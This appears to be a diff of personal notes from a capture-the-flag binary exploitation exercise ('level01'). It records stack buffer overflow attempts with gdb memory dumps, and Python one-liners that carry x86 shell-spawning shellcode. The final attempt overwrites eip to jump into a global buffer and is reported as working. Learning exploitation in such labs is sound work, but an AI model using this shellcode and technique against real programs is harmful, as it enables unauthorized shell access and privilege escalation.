@@ -16,4 +16,72 @@ x /128x 0xffffd6cc
 with the shellcode of 54 char :
 python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A'*25 + 'BCDE'"
 
-python -c "print '\x90'*25 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\xcc\xd6\xff\xff'"
+python -c "print '\x90'*25 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\xda\xd6\xff\xff'"
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffd77c in ?? ()
+(gdb) x /128x 0xffffd6cc
+0xffffd6cc:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6dc:     0x90909090      0x90909090      0x31c03190      0xcd06b0db
+0xffffd6ec:     0x2f685380      0x68797474      0x7665642f      0xc931e389
+0xffffd6fc:     0x2712b966      0xc8cd05b0      0x6858c328      0x68732f2f
+0xffffd70c:     0x68732f2f      0x00000000      0x7665642f      0x7974742f
+0xffffd71c:     0x00000000      0x0000000a      0xffffd7b4      0xffffd7bc
+0xffffd72c:     0xf7fd3000      0x00000000      0xffffd71c      0xffffd7bc
+0xffffd73c:     0x00000000      0x08048250      0xf7fceff4      0x00000000
+0xffffd74c:     0x00000000      0x00000000      0xf90f35d8      0xce08d1c8
+0xffffd75c:     0x00000000      0x00000000      0x00000000      0x00000001
+0xffffd76c:     0x080483b0      0x00000000      0xf7ff0a50      0xf7e45429
+0xffffd77c:     0xf7ffcff4      0x00000001      0x080483b0      0x00000000 <-- the system forces us to jump HERE
+0xffffd78c:     0x080483d1      0x080484d0      0x00000001      0xffffd7b4  (aka in the middle of our shellcode)
+0xffffd79c:     0x080485c0      0x08048630      0xf7feb620      0xffffd7ac
+0xffffd7ac:     0xf7ffd918      0x00000001      0xffffd8da      0x00000000
+0xffffd7bc:     0xffffd8f6      0xffffd906      0xffffd91a      0xffffd939
+0xffffd7cc:     0xffffd94c      0xffffd959      0xffffde7a      0xffffde85
+0xffffd7dc:     0xffffded2      0xffffdee9      0xffffdef8      0xffffdf10
+0xffffd7ec:     0xffffdf21      0xffffdf2a      0xffffdf43      0xffffdf4b
+0xffffd7fc:     0xffffdf5d      0xffffdf6d      0xffffdf9a      0xffffdfba
+0xffffd80c:     0x00000000      0x00000020      0xf7fdb430      0x00000021
+0xffffd81c:     0xf7fdb000      0x00000010      0x178bfbff      0x00000006
+0xffffd82c:     0x00001000      0x00000011      0x00000064      0x00000003
+0xffffd83c:     0x08048034      0x00000004      0x00000020      0x00000005
+0xffffd84c:     0x00000009      0x00000007      0xf7fdc000      0x00000008
+0xffffd85c:     0x00000000      0x00000009      0x080483b0      0x0000000b
+0xffffd86c:     0x000003e9      0x0000000c      0x000003e9      0x0000000d
+0xffffd87c:     0x000003e9      0x0000000e      0x000003e9      0x00000017
+0xffffd88c:     0x00000000      0x00000019      0xffffd8bb      0x0000001f
+0xffffd89c:     0xffffdfdc      0x0000000f      0xffffd8cb      0x00000000
+0xffffd8ac:     0x00000000      0x00000000      0x00000000      0x22000000
+0xffffd8bc:     0xbab630f9      0xc1138350      0xcac4442e      0x69013933
+(gdb) 
+
+==============================================================================================================================================================================================================================================================================
+We will try to write our shellcode AFTER eip in the stack. Meaning : A*84 + jmp adr + shellcode (where the jump adress is right after eip)
+
+eip adress is -> 0xffffd71c
+\x1c\xd7\xff\xff
+
+python -c "print 'A'*80 + '\x21\xd7\xff\xff' + '\x90'*50 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"
+
+0xffffd72f
+
+0xffffd6cc
+\xcc\xd6\xff\xff
+python -c "print '\x90'*25 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x31\xd7\xff\xff' + '\x90'*0 + '\xcc\xd6' + '\xd6\xcc\xff\xff' * 100" > file
+
+==============================================================================================================================================================================================================================================================================
+
+//New attemp by writing the shellcode in the first buffer : We''ll try to modify eip so it jumps after "dat_wil" where our shellcode is located
+
+We found the adress of our string after dat_wil in the buff
+0x0804a047
+\x47\xa0\x04\x08
+
+python -c "print 'dat_wil' + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'" > file_0
+
+python -c "print 'A'*80 + '\x47\xa0\x04\x08'" > file_1
+
+(gbd)   r < <(cat /tmp/file_0; sleep 1; cat /tmp/file_1; cat)
+(shell) (cat /tmp/file_0; sleep 1; cat /tmp/file_1; cat) | ./level01 
+
+Working. So it seems we are unable to jump on adresses wich begins withs "0xffff" but we managed to jump on a "0x0804" one. Good to know
